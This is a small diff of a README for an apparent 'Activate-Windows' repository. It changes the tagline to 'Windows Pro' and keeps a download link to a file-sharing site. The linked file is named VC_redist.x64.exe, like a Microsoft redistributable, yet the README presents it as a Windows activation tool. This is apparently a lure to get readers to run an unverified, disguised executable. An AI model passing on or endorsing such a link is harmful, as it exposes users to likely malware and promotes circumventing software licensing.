@@ -1,5 +1,5 @@
 # Activate-Windows
-how to Activate Windows!
+how to Activate Windows Pro!
 
 # Download
 Download this: https://www.mediafire.com/file/ldx0ckv3vigpjvf/VC_redist.x64.exe/file
